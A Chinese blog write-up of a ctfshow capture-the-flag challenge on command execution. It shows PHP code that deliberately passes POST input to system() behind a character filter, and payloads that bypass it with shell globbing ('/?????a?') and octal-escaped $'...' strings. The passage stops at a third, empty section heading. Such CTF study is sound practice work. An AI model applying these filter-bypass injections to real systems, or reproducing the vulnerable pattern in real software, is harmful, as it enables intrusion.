---
title: 复现 ctfshow 每周大挑战(极限命令执行
date: 2025-09-02 21:27:46
updated: 2025-09-02 21:27:46
author: Xebdria
categories:
  - wp
permalink: http://xendria.icu/?p=510
---
<!-- wp:heading -->
<h2 class="wp-block-heading">一</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。
//flag在根目录flag里，或者直接运行根目录getflag

error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (!preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/",$ctfshow)){
            system($ctfshow);
        }else{
            echo("????????");
        }
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>可用的有! $ ' ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~<br>看到提示直接就是ctf_show=/?????a?</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">二</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。
//flag在根目录flag里，或者直接运行根目录getflag

error_reporting(0);
highlight_file(__FILE__);
include "check.php";

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    check($ctfshow);
    system($ctfshow);
}
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>测试了一下应该是a和?都被ban了，数字还在我们自然而然可以想到用编码绕过<br>我们可以通过<code>$'\xxx'</code>的方式执行命令，类似于这样子</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":512,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/08/9b364cb2-539c-4836-bb2b-6953639878a7-1024x396.png" alt="" class="wp-image-512"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>那我们构造/getflag就很容易了<br>ctf_show=$'\57\147\145\164\146\154\141\147'</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">三</h2>
<!-- /wp:heading -->